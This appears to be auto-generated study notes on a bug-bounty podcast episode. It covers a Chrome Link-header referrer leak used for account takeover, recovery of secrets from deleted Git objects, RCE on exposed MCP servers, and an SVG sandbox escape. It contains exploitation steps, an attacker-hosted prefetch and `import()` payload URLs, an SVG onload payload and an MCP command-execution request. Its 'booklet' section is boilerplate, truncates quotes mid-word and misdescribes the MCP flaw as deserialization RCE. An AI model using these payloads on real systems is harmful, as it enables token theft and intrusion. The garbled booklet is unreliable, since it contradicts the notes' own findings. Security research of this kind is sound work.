---
title: "Slonser's Image Injection 0-day → ATO & New Caido Collab Plugin"
episode: 121
---


# Episode 121 Slonser's Image Injection 0-day → ATO & New Caido Collab Plugin

### TL;DR
- Slonser's Chrome 0-day: `Link` header in image response sets `referrerpolicy=unsafe-url` + triggers prefetch → leaks full URL (OAuth codes, query params) from any image injection
- Sharon's "How I made $64k from deleted files" — Git deleted file recovery via dangling objects and unpacked packfiles
- MCP security audit: "May Cause Pwnage" — RCE via `SSE` transport with `command=calc.exe`
- Gareth Hayes' SVG onload event quirk: `evt` parameter vs `event` — `evt.composedPath()[0].ownerDocument.defaultView` gives DOM reference from SVG
- Caido "Drop" plugin: PGP-encrypted collaboration (share scopes, filters, match-and-replace, replay tabs)

### Key Takeaways
- Any image injection (img src, CSS background, font-face) can be exploited with `Link` header: server responds with `Link: <url>; rel=prefetch; referrerpolicy=unsafe-url` — browser prefetches the URL with **full** referrer including query parameters
- The `Link` header technique works recursively: multiple `Link` headers create a chain of prefetches
- Also enables: zero-click GET-based CSRF (prefetch sends cookies), viewport size leak via `media` queries, compression dictionary manipulation
- Sharon recovered deleted files from Git history — files remain in `.git/objects` for ~2 weeks before garbage collection; also unpacked packfiles
- MCP (Model Context Protocol) servers exposed on internet: `SSE` transport with `command=calc.exe` gives RCE — no auth required
- Caido "Drop" plugin: end-to-end encrypted sharing of requests, scopes, filters — PGP-based

### Bugs and Findings

#### Slonser's Chrome 0-day — Link Header Referrer Leak
- **Target/context:** Any page that loads user-controlled image URLs
- **Root cause:** Chrome processes `Link` headers on subresource (image) responses. `Link: <url>; rel=prefetch; referrerpolicy=unsafe-url` — causes browser to prefetch `url` with the **full referrer** (including query parameters and hash)
- **Technique / how found:**
  1. Find image injection on target page (img src, CSS background, font-face, etc.)
  2. Point image to attacker-controlled server
  3. Server responds with 1x1 pixel + `Link: <https://attacker.com/track>; rel=prefetch; referrerpolicy=unsafe-url`
  4. Browser prefetches `attacker.com/track` with `Referer: https://victim.com/page?oauth_code=secret`
- **Exploitation steps:**
  1. Find any image injection point on victim page
  2. Set up server that returns image + malicious Link header
  3. Wait for victim to load the page (or entice them to)
  4. OAuth code / query parameter / sensitive URL data leaked via prefetch referrer
  5. Use leaked OAuth code for ATO
- **Key technical details:** `Link: <url>; rel=prefetch; referrerpolicy=unsafe-url`; works with img src, CSS background-image, font-face src, dynamically generated images; prefetch sends cookies (GET-based CSRF); multiple Link headers chain recursively
- **Impact / severity / bounty:** One-click ATO (leak OAuth code) — saw 15+ ATO payouts in CTBB community
- **Obstacles & how solved:** Quickly fixed by Google (much faster than expected); developers can mitigate via strict CSP `img-src` or proxying user images through own server

#### "How I Made $64k from Deleted Files" — Git Secrets Recovery
- **Target/context:** GitHub repositories (public and private programs)
- **Root cause:** Git objects remain in `.git/objects` ~2 weeks after deletion before garbage collection; unpacked packfiles also retain deleted content indefinitely
- **Technique / how found:** Deep Git history analysis — iterate over all commits (not just HEAD), recover dangling objects, unpack packfiles. Used TruffleHog for scanning.
- **Key technical details:** Deleted files remain ~2 weeks before GC; rebase does not remove old objects; packfiles can be unpacked; binary files (`.pyc`, `.sqlite`) often contain secrets developers thought were safe; top reported: GCP project tokens, AWS production tokens
- **Impact / severity / bounty:** $64,000 total from multiple programs
- **Obstacles & how solved:** Scale — hundreds of repos, terabytes of data; used smart iteration over specific programs' commit histories; AI-assisted repo discovery

#### MCP "May Cause Pwnage" — RCE via Exposed MCP Servers
- **Target/context:** Model Context Protocol servers exposed on internet
- **Root cause:** MCP servers use SSE transport; `command` parameter can specify arbitrary executable; RCE via `command=calc.exe`
- **Technique / how found:** Scanned internet for exposed MCP servers (non-standard ports); sent SSE transport request with `command=calc.exe`
- **Key technical details:** MCP SSE transport: `GET /sse?transport=stdio&command=calc.exe`; also vulnerable: DNS rebinding, path traversal in tool calls, SSRF, LFI, Git command injection
- **Impact / severity / bounty:** RCE, SSRF, LFI — 104 C2 servers identified
- **Obstacles & how solved:** Some MCP servers require auth; scanning non-standard ports

#### Gareth Hayes' SVG onload Event Parameter Quirk
- **Target/context:** SVG onload handlers in JavaScript sandboxes
- **Root cause:** In SVG elements, the event handler parameter is `evt` (not `event`). `evt.composedPath()[0].ownerDocument.defaultView` gives a reference to the Window/Document object from inside the SVG.
- **Technique / how found:** In sandboxed environments where `document` or `window` references are blocked, use `<svg onload="evt.composedPath()[0].ownerDocument.defaultView.alert(1)">` to get a DOM reference
- **Key technical details:** `evt` instead of `event` for SVG event handlers; `composedPath()[0]` gets the SVG element; `.ownerDocument.defaultView` gets the Window object
- **Impact / severity / bounty:** Sandbox escape — obtain Window/Document reference in restricted contexts
- **Obstacles & how solved:** [Speculated] Workaround for IE compatibility (global `window.event` namespace conflict)

### Techniques and Primitives
- **Link header referrer leak** — `Link: <url>; rel=prefetch; referrerpolicy=unsafe-url` on image subresource response
- **Link header media queries** — `media` attribute leaks viewport size (cross-site leak)
- **Git dangling object recovery** — `git fsck --lost-found` + unpack packfiles; ~2 week window before GC
- **`evt.composedPath()` sandbox escape** — SVG onload provides `evt` parameter; `evt.composedPath()[0].ownerDocument.defaultView` = Window object
- **import() for XSS** — `import('https://attacker.com/payload.js')` dynamically imports module — bypasses some script-loading filters

### Tooling and Resources
- Slonser's Chrome 0-day writeup
- Sharon Brizinov's "How I made $64k from deleted files"
- "May Cause Pwnage" MCP security audit
- Caido "Drop" plugin (PGP-encrypted collaboration)
- Subdomain Link Launcher (Rez0's tool)

### Suggestions and Advices from Hunter
- "The Link header technique completely removes a security boundary that's been in place for years"
- "Binary files like .pyc in Git repos often contain secrets — developers think binary = safe from code review"
- "MCP is just an API — but the standardization means bugs apply across all clients"
- "For the SVG onload quirk: `evt.composedPath()[0].ownerDocument.defaultView` gives you a window reference in sandboxed contexts"

### AI Takeaway
The Slonser `Link` header technique is one of the most impactful browser-level primitives in recent years. Although quickly patched, the fact that it enabled one-click ATO across any image injection was a game-changer. The `import()` function for dynamic script loading is a useful XSS gadget to add to payload lists.
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
Slonser's Chrome 0-day: `Link` header in image response sets `referrerpolicy=unsafe-url` + triggers prefetch → leaks full URL (OAuth codes, query params) from any image injection

#### 2. What you should learn
- Understand **any image injection (img src, css background, font-face) can be exploited with `link` header: server responds with `link: <url>; rel=prefetch; referrerpolicy=unsafe-url` — browser prefetches the url with full referrer including query parameters**
- Understand **the `link` header technique works recursively: multiple `link` headers create a chain of prefetches**
- Understand **also enables: zero-click get-based csrf (prefetch sends cookies), viewport size leak via `media` queries, compression dictionary manipulation**
- Understand **sharon recovered deleted files from git history — files remain in `.git/objects` for ~2 weeks before garbage collection; also unpacked packfiles**
- Understand **mcp (model context protocol) servers exposed on internet: `sse` transport with `command=calc.exe` gives rce — no auth required**

#### 3. Core concepts explained
**Slonser's Chrome 0-day — Link Header Referrer Leak**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**"How I Made $64k from Deleted Files" — Git Secrets Recovery**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**MCP "May Cause Pwnage" — RCE via Exposed MCP Servers**
- **What it is:** Remote Code Execution via deserialization — attacker-controlled data is deserialized by the server, triggering code execution through object injection or gadget chains.
- **Why it matters:** Deserialization RCE is typically critical severity. It often requires chaining multiple primitives (object injection → Redis injection → RCE).
- **Common mistake:** Giving up when direct exploitation is blocked — look for pivoting techniques like Redis SLAVEOF replication.

**Link header referrer leak**
- `Link: <url>; rel=prefetch; referrerpolicy=unsafe-url` on image subresource response

**Link header media queries**
- `media` attribute leaks viewport size (cross-site leak)

**Git dangling object recovery**
- `git fsck --lost-found` + unpack packfiles; ~2 week window before GC


#### 4. Techniques and tactics
**Link header referrer leak**
- **What it is:** `Link: <url>; rel=prefetch; referrerpolicy=unsafe-url` on image subresource response
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Link header media queries**
- **What it is:** `media` attribute leaks viewport size (cross-site leak)
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Git dangling object recovery**
- **What it is:** `git fsck --lost-found` + unpack packfiles; ~2 week window before GC
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**`evt.composedPath()` sandbox escape**
- **What it is:** SVG onload provides `evt` parameter; `evt.composedPath()[0].ownerDocument.defaultView` = Window object
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**import() for XSS**
- **What it is:** `import('https://attacker.com/payload.js')` dynamically imports module — bypasses some script-loading filters
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.


#### 5. Good Quotes
- *"The Link header technique completely removes a security boundary that's been in place for years"*
- *"Binary files like .pyc in Git repos often contain secrets"* — **developers think binary = safe from code review**
- *"MCP is just an API"* — **but the standardization means bugs apply across all clients**
- *"For the SVG onload quirk: `evt.composedPath()[0].ownerDocument.defaultView` gives you a window reference in sandboxed contexts"*

#### 6. Mental models
- **The Link header technique completely removes a security boun** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Binary files like .pyc in Git repos often contain secrets — ** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **MCP is just an API — but the standardization means bugs appl** — This mindset helps you find bugs others miss by approaching the problem from a different angle.

#### 7. Real-world application
- **Try this:** Any image injection (img src, CSS background, font-face) can be exploited with `Link` header: server responds with `Link: <url>; rel=prefetch; referrerpolicy=unsafe-url` — browser prefetches the URL with full referrer including query parameters
- **Try this:** The `Link` header technique works recursively: multiple `Link` headers create a chain of prefetches
- **Try this:** Also enables: zero-click GET-based CSRF (prefetch sends cookies), viewport size leak via `media` queries, compression dictionary manipulation
- **Try this:** Sharon recovered deleted files from Git history — files remain in `.git/objects` for ~2 weeks before garbage collection; also unpacked packfiles

#### 8. Red flags and pitfalls
- - Obstacles & how solved: Quickly fixed by Google (much faster than expected); developers can mitigate via strict CSP `img-src` or proxying user images through own server
- - Obstacles & how solved: Scale — hundreds of repos, terabytes of data; used smart iteration over specific programs' commit histories; AI-assisted repo discovery

#### 9. Vocabulary
- **XSS** — Cross-Site Scripting — injecting JavaScript into web pages viewed by other users
- **CSRF** — Cross-Site Request Forgery — tricking users into making unwanted requests
- **RCE** — Remote Code Execution — running arbitrary code on a target server
- **OAuth** — Open standard for authorization — delegated access without sharing passwords
- **0-day** — Vulnerability unknown to the vendor — no patch available

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in Slonser's Chrome 0-day — Link Header Referrer Leak?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
3. **Reasoning:** Why is this technique effective against the target? What makes it work?
4. **Application:** How would you adapt this technique if the target had a WAF blocking obvious payloads?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.

#### 11. The practical takeaway
1. **Slonser's Chrome 0-day: `Link` header in image response sets `referrerpolicy=uns**
2. **Any image injection (img src, CSS background, font-face) can be exploited with `**
3. **The `Link` header technique works recursively: multiple `Link` headers create a **
